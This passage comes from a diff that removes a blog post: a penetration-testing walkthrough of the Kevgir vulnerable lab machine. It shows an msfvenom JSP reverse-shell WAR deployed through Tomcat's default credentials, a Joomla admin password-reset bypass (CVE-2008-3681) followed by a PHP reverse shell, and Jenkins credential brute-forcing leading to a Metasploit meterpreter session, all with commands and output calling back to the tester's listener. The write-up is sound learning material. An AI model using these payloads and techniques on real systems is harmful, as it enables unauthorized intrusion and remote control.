-rdb_last_bgsave_status:ok
-rdb_last_bgsave_time_sec:-1
-rdb_current_bgsave_time_sec:-1
-aof_enabled:0
-aof_rewrite_in_progress:0
-aof_rewrite_scheduled:0
-aof_last_rewrite_time_sec:-1
-aof_current_rewrite_time_sec:-1
-aof_last_bgrewrite_status:ok
-aof_last_write_status:ok</p>
-
-<h1>Stats</h1>
-
-<p>total_connections_received:2
-total_commands_processed:2
-instantaneous_ops_per_sec:0
-total_net_input_bytes:41
-total_net_output_bytes:6067614
-instantaneous_input_kbps:0.00
-instantaneous_output_kbps:0.00
-rejected_connections:0
-sync_full:0
-sync_partial_ok:0
-sync_partial_err:0
-expired_keys:0
-evicted_keys:0
-keyspace_hits:0
-keyspace_misses:0
-pubsub_channels:0
-pubsub_patterns:0
-latest_fork_usec:0
-migrate_cached_sockets:0</p>
-
-<h1>Replication</h1>
-
-<p>role:master
-connected_slaves:0
-master_repl_offset:0
-repl_backlog_active:0
-repl_backlog_size:1048576
-repl_backlog_first_byte_offset:0
-repl_backlog_histlen:0</p>
-
-<h1>CPU</h1>
-
-<p>used_cpu_sys:3.71
-used_cpu_user:1.60
-used_cpu_sys_children:0.00
-used_cpu_user_children:0.00</p>
-
-<h1>Cluster</h1>
-
-<p>cluster_enabled:0</p>
-
-<h1>Keyspace</h1>
-
-<p>192.168.217.128:6379>
-```</p>
-
-<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>
-
-<h2>Tomcat default credentials</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
-| http-methods:
-|_  Potentially risky methods: PUT DELETE
-|_http-open-proxy: Proxy might be redirecting requests
-|_http-server-header: Apache-Coyote/1.1
-|_http-title: Apache Tomcat
-</code></p>
-
-<p>Time to look at that Tomcat server!</p>
-
-<p>```
-nikto -h <a href="http://192.168.217.128:8080/">http://192.168.217.128:8080/</a></p>
-
-<h2>&ndash; Nikto v2.1.6</h2>
-
-<ul>
-<li>Target IP:          192.168.217.128</li>
-<li>Target Hostname:    192.168.217.128</li>
-<li>Target Port:        8080
-
-<ul>
-<li>Start Time:         2017-12-03 12:21:45 (GMT-5)</li>
-</ul>
-</li>
-</ul>
-
-
-<hr />
-
-<ul>
-<li>Server: Apache-Coyote/1.1</li>
-<li>Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000</li>
-<li>The anti-clickjacking X-Frame-Options header is not present.</li>
-<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
-<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
-<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
-<li>Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</li>
-<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
-<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
-<li>/: Appears to be a default Apache Tomcat install.</li>
-<li>/examples/servlets/index.html: Apache Tomcat default JSP pages present.</li>
-<li>OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</li>
-<li>Default account found for &lsquo;Tomcat Manager Application&rsquo; at /manager/html (ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;). Apache Tomcat.</li>
-<li>/manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
-<li>/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
-<li>/manager/status: Tomcat Server Status interface found (pass protected)</li>
-<li>7661 requests: 0 error(s) and 14 item(s) reported on remote host
-
-<ul>
-<li>End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)</li>
-</ul>
-</li>
-</ul>
-
-
-<hr />
-
-<ul>
-<li>1 host(s) tested
-```</li>
-</ul>
-
-
-<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>
-
-<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="&lsquo;manager&rsquo; &lsquo;tomcat web application manager&rsquo;" ></p>
-
-<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>
-
-<p><code>
-msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
-Payload size: 1099 bytes
-Final size of war file: 1099 bytes
-Saved as: runme.war
-</code></p>
-
-<p>Check what&rsquo;s inside:</p>
-
-<p><code>
-jar -tf runme.war
-WEB-INF/
-WEB-INF/web.xml
-kndeoavjwgjs.jsp
-</code></p>
-
-<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>
-
-<p><code>
-nc -vnlp 8888
-listening on [any] 8888 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
-whoami
-tomcat7
-</code></p>
-
-<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>
-
-<h2>Joomla</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-generator: Joomla! 1.5 - Open Source Content Management
-| http-robots.txt: 14 disallowed entries
-| /administrator/ /cache/ /components/ /images/
-| /includes/ /installation/ /language/ /libraries/ /media/
-|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: Welcome to the Frontpage
-</code></p>
-
-<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>
-
-<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>
-
-<p>```
-* The Exact version found is 1.5.1</p>
-
-<h1>15</h1>
-
-<p>Info &ndash;> CoreComponent: Joomla Remote Admin Password Change Vulnerability
-Versions Affected: 1.5.5 &lt;=
-Check: /components/com_user/controller.php
-Exploit: 1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm  2. Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
-Vulnerable? Yes
-```</p>
-
-<p>This vulnerability is tracked under CVE-2008-3681:</p>
-
-<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
-allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>
-
-<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>
-
-<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="&lsquo;token&rsquo; &lsquo;password reset bypass&rsquo;" ></p>
-
-<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>
-
-<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>
-
-<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>
-
-<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="&lsquo;template&rsquo; &lsquo;joomla template&rsquo;" ></p>
-
-<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>
-
-<p><code>
-nc -vnlp 8888
-listening on [any] 8888 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
-Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
- 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$
-</code></p>
-
-<h2>Jenkins</h2>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-9000/tcp  open  http        Jetty winstone-2.9
-| http-robots.txt: 1 disallowed entry
-|_/
-|_http-server-header: Jetty(winstone-2.9)
-|_http-title: Dashboard [Jenkins]
-</code></p>
-
-<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="&lsquo;jenkins&rsquo; &lsquo;jenkins dashboard&rsquo;" ></p>
-
-<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>
-
-<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
-tasks related to building, testing, and delivering or deploying software.</p></blockquote>
-
-<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>
-
-<p>```
-msf auxiliary(jenkins_enum) > info</p>
-
-<pre><code>   Name: Jenkins-CI Enumeration
- Module: auxiliary/scanner/http/jenkins_enum
-License: Metasploit Framework License (BSD)
-   Rank: Normal
-</code></pre>
-
-<p>Provided by:
-  Jeff McCutchan</p>
-
-<p>Basic options:
-  Name       Current Setting  Required  Description</p>
-
-<hr />
-
-<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-  RHOSTS                      yes       The target address range or CIDR identifier
-  RPORT      80               yes       The target port (TCP)
-  SSL        false            no        Negotiate SSL/TLS for outgoing connections
-  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
-  THREADS    1                yes       The number of concurrent threads
-  VHOST                       no        HTTP server virtual host</p>
-
-<p>Description:
-  This module enumerates a remote Jenkins-CI installation in an
-  unauthenticated manner, including host operating system and Jenkins
-  installation details.
-```</p>
-
-<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>
-
-<p>```
-msf auxiliary(jenkins_enum) > exploit</p>
-
-<p>[+] 192.168.217.128:9000  &ndash; Jenkins Version 1.647
-[<em>] /script restricted (403)
-[</em>] /view/All/newJob restricted (403)
-[+] <a href="http://192.168.217.128:9000/">http://192.168.217.128:9000/</a> &ndash; /asynchPeople/ does not require authentication (200)
-[*] /systemInfo restricted (403)
-```</p>
-
-<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>
-
-<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="&lsquo;jenkins admin&rsquo; &lsquo;jenkins admin&rsquo;" ></p>
-
-<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>
-
-<p>```
-Module options (auxiliary/scanner/http/jenkins_login):</p>
-
-<p>   Name              Current Setting                                     Required  Description</p>
-
-<hr />
-
-<p>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
-   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
-   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
-   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
-   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
-   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
-   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
-   PASSWORD                                                              no        A specific password to authenticate with
-   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
-   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
-   RPORT             9000                                                yes       The target port (TCP)
-   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
-   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
-   THREADS           1                                                   yes       The number of concurrent threads
-   USERNAME          admin                                               no        A specific username to authenticate as
-   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
-   USER_AS_PASS      false                                               no        Try the username as the password for all users
-   USER_FILE                                                             no        File containing usernames, one per line
-   VERBOSE           true                                                yes       Whether to print output for all attempts
-   VHOST                                                                 no        HTTP server virtual host
-```</p>
-
-<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>
-
-<p><code>
-[+] 192.168.217.128:9000 - Login Successful: admin:hello
-</code></p>
-
-<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>
-
-<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>
-
-<p>Don&rsquo;t forget to select the target as Linux:</p>
-
-<p>```
-options</p>
-
-<p>Module options (exploit/multi/http/jenkins_script_console):</p>
-
-<p>   Name       Current Setting  Required  Description</p>
-
-<hr />
-
-<p>   API_TOKEN                   no        The API token for the specified username
-   PASSWORD   hello            no        The password for the specified username
-   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-   RHOST      192.168.217.128  yes       The target address
-   RPORT      9000             yes       The target port (TCP)
-   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-   SRVPORT    8080             yes       The local port to listen on.
-   SSL        false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                yes       The path to the Jenkins-CI application
-   URIPATH                     no        The URI to use for this exploit (default is random)
-   USERNAME   admin            no        The username to authenticate as
-   VHOST                       no        HTTP server virtual host</p>
-
-<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>
-
-<p>   Name   Current Setting  Required  Description</p>
-
-<hr />
-
-<p>   LHOST  192.168.217.132  yes       The listen address
-   LPORT  8080             yes       The listen port</p>
-
-<p>Exploit target:</p>
-
-<p>   Id  Name</p>
-
-<hr />
-
-<p>   1   Linux
-```</p>
-
-<p>And a new shell appears!</p>
-
-<p>```
-msf exploit(jenkins_script_console) > exploit</p>
-
-<p>[<em>] Started reverse TCP handler on 192.168.217.132:8080
-[</em>] Checking access to the script console
-[<em>] Logging in&hellip;
-[</em>] 192.168.217.128:9000 &ndash; Sending Linux stager&hellip;
-[<em>] Sending stage (849108 bytes) to 192.168.217.128
-[</em>] Meterpreter session 1 opened (192.168.217.132:8080 &ndash;> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500</p>
-
-<p>meterpreter >
-[!] Deleting /tmp/wE472W payload file
-```</p>
-
-<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-46201/tcp open  unknown
-| fingerprint-strings:
-|   DNSStatusRequest:
-|     Unrecognized protocol:
-|   DNSVersionBindReq:
-|     Unrecognized protocol:
-|     version
-|_    bind
-53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
-SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
-SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
-SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
-</code></p>
-
-<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>
-
-<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
-network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
-TCP/IP and UDP/IP via Java NIO.</p></blockquote>
-
-<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>
-
-<h3>Learn more</h3>
-
-<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ This will be a memorable month &mdash; no  \
-\ matter how hard you try to forget it. /</p>
 
 <hr />
 
